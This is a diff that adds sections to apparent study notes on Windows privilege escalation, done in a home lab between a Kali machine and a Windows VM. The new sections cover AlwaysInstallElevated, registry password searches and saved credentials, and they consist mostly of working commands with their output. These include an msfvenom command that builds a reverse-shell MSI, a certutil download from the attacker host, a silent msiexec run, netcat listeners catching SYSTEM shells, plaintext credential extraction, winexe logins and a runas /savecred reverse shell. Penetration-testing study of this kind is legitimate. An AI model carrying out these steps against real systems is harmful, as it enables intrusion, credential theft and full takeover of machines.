@@ -749,9 +749,9 @@ nt authority\system
 ```
 
 
-## Registry
+## 8.Registry
 
-__AutoRuns__
+### 8.1 AutoRuns
 
 - Windows can be configured to run commands at startup, with elevated privileges.
 - These `Autoruns` are configured in the Registry.
@@ -846,8 +846,7 @@ __Result__
 
 ```bash
 ──(kali㉿kali)-[~/windows-priv-esc]
-└─$ sudo nc -lvnp  9001                                                                                                                                                                   6 ⚙
-[sudo] password for kali: 
+└─$ sudo nc -lvnp  9001
 listening on [any] 9001 ...
 connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 49723
 Microsoft Windows [Version 10.0.17763.379]
@@ -857,5 +856,282 @@ C:\Windows\system32>whoami
 whoami
 msedgewin10\admin
 ```
+
+
+### 8.2 AlwaysInstallElevated
+
+- MSI files are package files used to install applications.
+- These files run with the permissions of the user trying to install them.
+- Windows allows for these installers to be run with elevated(i.e. admin)  privileges.
+- If this is the case, we can generate a malicious MSI file which conatins a reverse shell.
+
+- The catch is that two Registry settings must be enabled for this to work.
+- The `AlwaysInstallElevated` value must be set to `1` for both the local machine:
+
+`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+- and the current user:
+`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
+- if either of these are missing or disabled, the exploit will not work.
+
+- Run winpeas with `windowscreds` switch
+```bash
+  [+] Checking AlwaysInstallElevated(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+```
+
+- Verifying manually
+
+```bash
+C:\PrivEsc>reg query HKCU\SOFTWARE\policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\PrivEsc>reg query HKLM\SOFTWARE\policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+- Create a new reverse shell with `.msi`
+- Copy the reverse shell into windows 
+- Setup the listener in kali and execute the reverse shell on windows
+
+- Payload `msfvenom`
+```bash
+$  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.37.128 LPORT=9001 -f msi -o reverse_9001.msi
+```
+
+```bash
+C:\PrivEsc>certutil -urlcache -f http://192.168.37.128/reverse_9001.msi  reverse_9001.msi
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\PrivEsc>msiexec /quiet /qn /i reverse_9001.msi #execution
+```
+
+__Result__
+```bash
+┌──(kali㉿kali)-[~/windows-priv-esc]
+└─$ nc -lvnp 9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 49771
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+
+## 9. Passwords
+
+- Password reuse is common, or sometimes can be found in readable locations.
+- Windows can be especially vulnerable to this, as several features of windows store passwords insecurely.
+
+### 9.1 Registry
+- Plenty of programs store confifuration optuions in the Windows registry.
+- Windows itslef sometimes will store passwords in plaintext in the registry.
+- It is always worth seraching the registry for passwords.
+__Searching the registry for passwords__
+- The following commands will search the rgistry for keys and values that contains "password"
+
+```bash
+reg query HKLM /f password /t REG_SZ /s
+```
+
+- `HKLM`- searches local machine 
+
+```bash
+reg query HKCU /f password /t REG_SZ /s
+```
+- `HKCU`- searches current user's 
+- This usually generates lot of results, better to look in known locations.
+
+- Run winpeas with `filesinfo` and `userinfo` switches.
+
+Sample output
+```bash
+  [+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultUserName               :  admin
+    DefaultPassword               :  password123
+```
+```bash
+ =====================(Interesting files and registry)=================
+
+  [+] Putty Sessions()
+    SessionName: BWP123F42
+    ProxyPassword: password123
+    ProxyUsername: admin
+```
+
+- We can verify this manually by querying the registry (querying auto logon credentails)
+
+```bash
+C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ
+    LegalNoticeText    REG_SZ
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x3584de11
+    ShutdownFlags    REG_DWORD    0x800002ab
+    DisableLockWorkstation    REG_DWORD    0x0
+    EnableFirstLogonAnimation    REG_DWORD    0x1
+    AutoLogonSID    REG_SZ    S-1-5-21-321011808-3761883066-353627080-1004
+    LastUsedUsername    REG_SZ    admin
+    DefaultPassword    REG_SZ    password123  # this one
+    AutoAdminLogonCount    REG_DWORD    0x14
+    DefaultUsername    REG_SZ    admin  # this one
+    AutoAdminLogon    REG_SZ    1
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey
+```
+
+- Querying for saved putty sessions
+
+```bash
+C:\PrivEsc>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42
+    ProxyUsername    REG_SZ    admin
+    ProxyPassword    REG_SZ    password123
+```
+
+- We can use `winexe` to spawn shells
+```bash
+(shashi@kali)-[~/windows-priv-esc]
+$ sudo winexe -U 'admin%password123' //192.168.37.134 cmd.exe                  
+(shashi@kali)-[~/windows-priv-esc]
+$ sudo winexe -U 'admin%password123' --system //192.168.37.134 cmd.exe 
+
+```
+
+__Searching registry entries__ (`password` as key or value)
+
+
+```bash
+C:\PrivEsc>reg query HKLM /f password /t REG_SZ /s
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
+    (Default)    REG_SZ    Picture Password Enrollment UX
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
+    (Default)    REG_SZ    PicturePasswordLogonProvider
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{24954E9B-D39A-4168-A3B2-E5014C94492F}
+    (Default)    REG_SZ    OOBE Upgrade Password Page
+```
+
+- Runs same as above but on Current user registry entries (`HKCU`)
+```bash
+C:\PrivEsc>reg query HKCU /f password /t REG_SZ /s
+```
+
+### 9.2 Saved Creds
+
+- Windows has runas command which allows users to run commands with the privileges of other users.
+- This usually required the knowlege of other user's password.
+- However, windows also allows users to save their credentails to the system, and these saved credentails can be used to bypass this requirement.
+
+
+- Running winpeas to find stored credentials
+```bash
+C:\PrivEsc>.\winPEASany.exe quiet cmd windowscreds > cmd_windowscreds.txt
+```
+__Sample output__
+```bash
+Currently stored credentials:
+
+    Target: MicrosoftAccount:target=SSO_POP_Device
+    Type: Generic 
+    User: 02yzlqlqtmaemclq
+    Saved for this logon only
+    
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic 
+    User: 02yzlqlqtmaemclq
+    Local machine persistence
+    
+    Target: Domain:interactive=MSEDGEWIN10\admin
+    Type: Domain Password
+    User: MSEDGEWIN10\admin
+```
+
+- We can check this manullay 
+```bash
+C:\PrivEsc>cmdkey /list
+
+Currently stored credentials:
+
+    Target: MicrosoftAccount:target=SSO_POP_Device
+    Type: Generic
+    User: 02yzlqlqtmaemclq
+    Saved for this logon only
+
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic
+    User: 02yzlqlqtmaemclq
+    Local machine persistence
+
+    Target: Domain:interactive=MSEDGEWIN10\admin
+    Type: Domain Password
+    User: MSEDGEWIN10\admin
+```
+
+- We can use savedcred to run commands as any user with `runas` command
+- running reverse shell using `runas`
+```bash
+C:\PrivEsc>runas /savecred /user:admin C:\PrivEsc\reverse_9001.exe
+Attempting to start C:\PrivEsc\reverse_9001.exe as user "MSEDGEWIN10\admin" ..
+```
+__Result__
+```bash
+└─$ nc -lvnp 9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 49831
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+msedgewin10\admin
+```
+
+
+### 9.3 Configuration Files
+
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
+
+
